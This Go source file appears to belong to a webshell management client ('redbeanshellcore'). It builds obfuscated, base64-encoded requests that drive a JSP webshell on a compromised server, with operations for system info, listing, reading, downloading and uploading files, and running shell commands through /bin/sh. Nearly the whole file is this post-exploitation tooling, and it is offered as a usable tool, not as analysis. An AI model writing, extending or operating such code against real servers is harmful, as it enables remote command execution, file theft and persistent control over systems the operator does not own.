package jsp

import (
	"context"
	"errors"
	"strings"

	"github.com/Yliken/redbeanshellcore/core"
)

// jspInfo with optional Obfuscator and ShellMode support.
type jspInfo struct {
	obf  *Obfuscator
	mode ShellMode
}

func NewJspInfo() *jspInfo {
	return &jspInfo{obf: DefaultObfuscator(), mode: ShellStatic}
}
func (p *jspInfo) WithObfuscator(obf *Obfuscator) *jspInfo { p.obf = obf; return p }
func (p *jspInfo) WithDynamic() *jspInfo                   { p.mode = ShellDynamic; return p }
func (p *jspInfo) Name() string                            { return "info" }
func (p *jspInfo) RiskLevel() core.RiskLevel               { return core.RiskReadOnly }

func (p *jspInfo) Build(_ context.Context, sess *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	if p.mode == ShellDynamic {
		tpl := &JSPTemplates{}
		req.Payload = []byte(b64(tpl.JSInfo()))
	} else {
		req.Payload = []byte(p.obf.ActionCode(p.Name()))
	}
	req.Meta["adapter"] = "jsp"
	if p.obf != nil {
		req.Meta["payload_form_field"] = p.obf.ActionField()
	}
	_ = sess
	return req, nil
}

func (p *jspInfo) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("jspInfo.Parse: response is nil")
	}
	return parseInfo(resp.Body), nil
}

// jspFileList
type jspFileList struct {
	target string
	obf    *Obfuscator
	mode   ShellMode
}

func NewJspFileList(path string) *jspFileList {
	if path == "" {
		path = "/"
	}
	return &jspFileList{target: path, obf: DefaultObfuscator(), mode: ShellStatic}
}
func (p *jspFileList) WithObfuscator(obf *Obfuscator) *jspFileList { p.obf = obf; return p }
func (p *jspFileList) WithDynamic() *jspFileList                   { p.mode = ShellDynamic; return p }
func (p *jspFileList) Name() string                                { return "file.list" }
func (p *jspFileList) RiskLevel() core.RiskLevel                   { return core.RiskReadOnly }

func (p *jspFileList) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	if p.mode == ShellDynamic {
		tpl := &JSPTemplates{}
		req.Payload = []byte(b64(tpl.JSFileList()))
	} else {
		req.Payload = []byte(p.obf.ActionCode(p.Name()))
	}
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "jsp"
	if p.obf != nil {
		req.Meta["payload_form_field"] = p.obf.ActionField()
	}
	return req, nil
}

func (p *jspFileList) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("jspFileList.Parse: response is nil")
	}
	if err := parseRemoteError(p.Name(), resp); err != nil {
		return nil, err
	}
	return parseFileList(p.target, resp.Body), nil
}

// jspFileRead
type jspFileRead struct {
	target string
	obf    *Obfuscator
	mode   ShellMode
}

func NewJspFileRead(path string) *jspFileRead {
	return &jspFileRead{target: path, obf: DefaultObfuscator(), mode: ShellStatic}
}
func (p *jspFileRead) WithObfuscator(obf *Obfuscator) *jspFileRead { p.obf = obf; return p }
func (p *jspFileRead) WithDynamic() *jspFileRead                   { p.mode = ShellDynamic; return p }
func (p *jspFileRead) Name() string                                { return "file.read" }
func (p *jspFileRead) RiskLevel() core.RiskLevel                   { return core.RiskReadOnly }

func (p *jspFileRead) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	if p.mode == ShellDynamic {
		tpl := &JSPTemplates{}
		req.Payload = []byte(b64(tpl.JSFileRead()))
	} else {
		req.Payload = []byte(p.obf.ActionCode(p.Name()))
	}
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "jsp"
	if p.obf != nil {
		req.Meta["payload_form_field"] = p.obf.ActionField()
	}
	return req, nil
}

func (p *jspFileRead) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("jspFileRead.Parse: response is nil")
	}
	if err := parseRemoteError(p.Name(), resp); err != nil {
		return nil, err
	}
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

// jspFileDownload
type jspFileDownload struct {
	target string
	obf    *Obfuscator
	mode   ShellMode
}

func NewJspFileDownload(path string) *jspFileDownload {
	return &jspFileDownload{target: path, obf: DefaultObfuscator(), mode: ShellStatic}
}
func (p *jspFileDownload) WithObfuscator(obf *Obfuscator) *jspFileDownload { p.obf = obf; return p }
func (p *jspFileDownload) WithDynamic() *jspFileDownload                   { p.mode = ShellDynamic; return p }
func (p *jspFileDownload) Name() string                                    { return "file.download" }
func (p *jspFileDownload) RiskLevel() core.RiskLevel                       { return core.RiskReadOnly }

func (p *jspFileDownload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	if p.mode == ShellDynamic {
		tpl := &JSPTemplates{}
		req.Payload = []byte(b64(tpl.JSFileDownload()))
	} else {
		req.Payload = []byte(p.obf.ActionCode(p.Name()))
	}
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "jsp"
	if p.obf != nil {
		req.Meta["payload_form_field"] = p.obf.ActionField()
	}
	return req, nil
}

func (p *jspFileDownload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("jspFileDownload.Parse: response is nil")
	}
	if err := parseRemoteError(p.Name(), resp); err != nil {
		return nil, err
	}
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

// jspFileUpload
type jspFileUpload struct {
	remote  string
	content []byte
	obf     *Obfuscator
	mode    ShellMode
}

func NewJspFileUpload(remotePath string, content []byte) *jspFileUpload {
	return &jspFileUpload{remote: remotePath, content: content, obf: DefaultObfuscator(), mode: ShellStatic}
}
func (p *jspFileUpload) WithObfuscator(obf *Obfuscator) *jspFileUpload { p.obf = obf; return p }
func (p *jspFileUpload) WithDynamic() *jspFileUpload                   { p.mode = ShellDynamic; return p }
func (p *jspFileUpload) Name() string                                  { return "file.upload" }
func (p *jspFileUpload) RiskLevel() core.RiskLevel                     { return core.RiskWrite }

func (p *jspFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	if p.mode == ShellDynamic {
		tpl := &JSPTemplates{}
		req.Payload = []byte(b64(tpl.JSFileUpload()))
	} else {
		req.Payload = []byte(p.obf.ActionCode(p.Name()))
	}
	req.SetParam(p.obf.Param1(), []byte(b64(p.remote)))
	req.SetParam(p.obf.Param2(), []byte(b64(string(p.content))))
	req.Meta["adapter"] = "jsp"
	if p.obf != nil {
		req.Meta["payload_form_field"] = p.obf.ActionField()
	}
	return req, nil
}

func (p *jspFileUpload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("jspFileUpload.Parse: response is nil")
	}
	trimmed := strings.TrimSpace(string(resp.Body))
	ok := trimmed == "1" || trimmed == "ok"
	return &core.BoolResult{
		BaseResult: core.NewBaseResult("file.upload", resp.Body),
		OK:         ok, Message: trimmed,
	}, nil
}

// jspExec
type jspExec struct {
	cmd    string
	bin    string
	envars map[string]string
	obf    *Obfuscator
	mode   ShellMode
}

func NewJspExec(cmd string) *jspExec {
	return &jspExec{cmd: cmd, bin: "/bin/sh", obf: DefaultObfuscator(), mode: ShellStatic}
}
func (p *jspExec) WithObfuscator(obf *Obfuscator) *jspExec { p.obf = obf; return p }
func (p *jspExec) WithDynamic() *jspExec                   { p.mode = ShellDynamic; return p }
func (p *jspExec) Name() string                            { return "exec" }
func (p *jspExec) RiskLevel() core.RiskLevel               { return core.RiskExec }

func (p *jspExec) WithBin(bin string) *jspExec { p.bin = bin; return p }
func (p *jspExec) WithEnv(key, value string) *jspExec {
	if p.envars == nil {
		p.envars = make(map[string]string)
	}
	p.envars[key] = value
	return p
}

func (p *jspExec) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	if p.mode == ShellDynamic {
		tpl := &JSPTemplates{}
		req.Payload = []byte(b64(tpl.JSExec()))
	} else {
		req.Payload = []byte(p.obf.ActionCode(p.Name()))
	}
	req.SetParam(p.obf.Param1(), []byte(b64(p.cmd)))
	req.Meta["adapter"] = "jsp"
	if p.obf != nil {
		req.Meta["payload_form_field"] = p.obf.ActionField()
	}
	return req, nil
}

func (p *jspExec) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil {
		return nil, errors.New("jspExec.Parse: response is nil")
	}
	return parseExec(resp.Body), nil
}

// b64 is a simple base64 encoder.
func b64(s string) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	if s == "" {
		return ""
	}
	var out []byte
	b := []byte(s)
	n := len(b)
	for i := 0; i < n; i += 3 {
		var v, pad int
		switch {
		case i+2 < n:
			v = int(b[i])<<16 | int(b[i+1])<<8 | int(b[i+2])
		case i+1 < n:
			v = int(b[i])<<16 | int(b[i+1])<<8
			pad = 1
		default:
			v = int(b[i]) << 16
			pad = 2
		}
		out = append(out, chars[(v>>18)&63])
		out = append(out, chars[(v>>12)&63])
		if pad < 2 {
			out = append(out, chars[(v>>6)&63])
		} else {
			out = append(out, '=')
		}
		if pad < 1 {
			out = append(out, chars[v&63])
		} else {
			out = append(out, '=')
		}
	}
	return string(out)
}
